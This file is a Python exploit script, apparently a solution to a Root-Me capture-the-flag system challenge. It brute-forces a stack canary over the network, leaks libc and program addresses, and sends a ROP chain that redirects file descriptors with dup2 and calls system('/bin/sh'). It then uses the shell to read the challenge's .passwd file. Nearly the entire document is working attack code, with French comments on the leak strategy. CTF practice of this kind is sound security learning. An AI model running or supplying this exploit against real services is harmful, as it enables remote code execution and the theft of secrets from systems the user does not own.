import re
import time
import struct
import socket
import binascii


HOST = 'challenge03.root-me.org'
PORT = 56542
# HOST = 'localhost'
# PORT = 9090
LEN = 1024


def hash(s):
    if len(s) == 0:
        return 0
    return int(binascii.hexlify(s),16)

def unhash(i):
    t = hex(i).replace('0x','').replace('L','')
    if len(t)%2 == 1:
        t = '0'+t
    return binascii.unhexlify(t)

def print_map(m):
    for i in m:
        for j in m[i]:
            print(i,unhash(j),m[i][j])

answers = {}

def update_map(l,buf):
    if answers.get(l) is None:
        answers[l] = {}
        answers[l][hash(buf)] = 1
    elif answers[l].get(hash(buf)) is None:
        answers[l][hash(buf)] = 1
    else:
        answers[l][hash(buf)] += 1

def test(input,s):
    s.recv(LEN)
    s.send(input)
    tmp = s.recv(LEN)

    if re.search('Bye!',tmp) is not None:
        return 'Bye'
    elif re.search('\n(.+)',tmp) is not None:
        return re.search('\n(.+)',tmp).group(1)
    try:
        buf = s.recv(LEN)
        if len(buf) == 0:
            buf = s.recv(LEN)
        elif re.search('Bye!',buf) is not None:
            return 'Bye'
        return buf
    except:
        return "Exception!"

def basic_get(input,interact=False):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.recv(LEN)
    s.send(input)

    if interact:
        print("========================")
        print(s.send("cat /challenge/app-systeme/ch42/.passwd\n"))
        print(s.recv(LEN))
        t = s.recv(LEN)
        print(t)
    else:
        tmp = binascii.hexlify(s.recv(LEN))
        tmp2 = tmp.split('0a')
        if len(tmp2[1])>0:
            t = tmp2[1]
        else:
            t = binascii.hexlify(s.recv(LEN))
    return t


def consequence(input,s):
    s.recv(LEN)
    time.sleep(0.001)
    s.send(input)
    time.sleep(0.001)
    tmp = s.recv(LEN)
    time.sleep(0.01)
    bypass = False
    if re.search('Bye!',tmp) is not None:
        bypass = True
    try:
        if not bypass:
            buf = s.recv(LEN)
            if len(buf) == 0:
                buf = s.recv(LEN)
        else:
            buf = 'Bye!\n'
        update_map(len(input),buf)
    except:
        buf = "Exception!"
        update_map(len(input),buf)

def leak_cookie():
    letters = []
    for i in range(1,ord('\n')):
        letters.append(chr(i))
    for i in range(ord('\n')+1,256):
        letters.append(chr(i))
    letters.append('\x00')
    letters.append('\n')

    cookie = ''
    for j in range(4):
        found = False
        i = 0
        while not found and i<256:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            if test('i'*32+cookie+letters[i],s) == 'Bye':
                found = True
                cookie += letters[i]
            s.close()
            i += 1
            time.sleep(0.01)

        if i<256:
            print("Found ! cur cookie = "+cookie)
            print(binascii.hexlify(cookie))

    return cookie


cur_cookie = leak_cookie()
#cur_cookie = binascii.unhexlify("00d02354")
cur_string = "a"*32+cur_cookie

# Hello :
# 0x56556060
# 0x56557060

# libc leak :
# 0x56557fcc

# avec i=226 et j=158 on obtient un leak sur la libc
# on peut recuperer un /bin/sh dans la libc, par BF ou bien si on a la libc, facilement, par rapport a l'offset leake
# plus qu'a recuperer un leak du .text pour le .data (la ou notre payload est copie)
# Facile !

local = 158
local_remote = 206
remote = 250
cur = remote

for i in range(256):
    tmp = basic_get("a"*32+cur_cookie+"b"*4+chr(254)+chr(i))
    if len(tmp)>0:
        print(i)
        print(tmp)

offset_system = 0xc150
offset_binsh = 0x12ce0f
offset_dup2 = 0x8562f+0x221b1
offset_poppopret = -0x26ec

offset_system = 0xce00
offset_binsh = 0x12d33c
offset_dup2 = 0xa8410
offset_poppopret = -0x26ec


#ici 254 et 158 permettent de leaker la libc depuis la GOT
addr_tmp = basic_get("a"*32+cur_cookie+"b"*4+chr(254)+chr(cur))
addr_leak_libc = addr_tmp[6:8]+addr_tmp[4:6]+addr_tmp[2:4]+addr_tmp[:2]
print(addr_leak_libc)
int_addr_binsh = int(addr_leak_libc,16)+offset_binsh
int_addr_system = int(addr_leak_libc,16)+offset_system
int_addr_dup2 = int(addr_leak_libc,16)+offset_dup2

#ici 22 et 159 permettent de leaker le text depuis a cote de la GOT
addr_tmp = basic_get("a"*32+cur_cookie+"b"*4+chr(278-256)+chr(cur+1))
addr_leak_text = addr_tmp[6:]+addr_tmp[4:6]+addr_tmp[2:4]+addr_tmp[:2]
int_addr_poppopret = int(addr_leak_text,16)+offset_poppopret
print(addr_leak_text)

print(binascii.hexlify(struct.pack('I',int_addr_binsh)))
print(binascii.hexlify(struct.pack('I',int_addr_system)))

print(basic_get("a"*32+cur_cookie+"b"*4+chr(262-256)+chr(cur+1)+"\x00\x80aaaa"+
    struct.pack('I',int_addr_dup2)+struct.pack('I',int_addr_poppopret)+"\x04\x00\x00\x00"+"\x01\x00\x00\x00"+
    struct.pack('I',int_addr_dup2)+struct.pack('I',int_addr_poppopret)+"\x04\x00\x00\x00"+"\x02\x00\x00\x00"+
    struct.pack('I',int_addr_dup2)+struct.pack('I',int_addr_poppopret)+"\x04\x00\x00\x00"+"\x00\x00\x00\x00"+
    struct.pack('I',int_addr_system)+struct.pack('I',int_addr_binsh)+struct.pack('I',int_addr_binsh),True))
exit()
